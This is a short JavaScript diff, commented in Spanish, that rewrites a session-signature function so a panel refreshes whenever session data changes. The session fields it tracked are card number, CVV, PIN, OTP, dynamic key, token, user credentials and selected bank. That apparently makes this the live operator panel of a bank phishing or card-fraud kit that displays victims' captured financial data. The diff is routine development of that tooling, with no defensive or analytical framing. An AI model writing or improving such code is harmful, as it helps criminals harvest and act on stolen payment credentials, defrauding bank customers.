@@ -361,17 +361,11 @@ setInterval(() => {
     });
 }, 1000);
 
+// 🔥 FIX: Ahora detecta cualquier cambio en los datos para actualizar el panel automáticamente 🔥
 function firmaSesiones(lista, activos) {
-    const firmaBase = lista.map(s => [
-        s.sessionId, s.estado, s.paso,
-        s.datos && s.datos.tarjeta, s.datos && s.datos.otp,
-        s.datos && s.datos.claveDinamica, s.datos && s.datos.token,
-        s.datos && s.datos.monto, s.datos && s.datos.precio,
-        s.datos && s.datos.authUsuario,
-        s.datos && s.datos.cvv,
-        s.datos && s.datos.pin,
-        s.datos && s.datos.bancoSeleccionado
-    ].join('|')).join('~');
+    const firmaBase = lista.map(s => {
+        return s.sessionId + '|' + s.estado + '|' + s.paso + '|' + JSON.stringify(s.datos || {});
+    }).join('~');
 
     let firmaActivos = '';
     lista.forEach(s => {
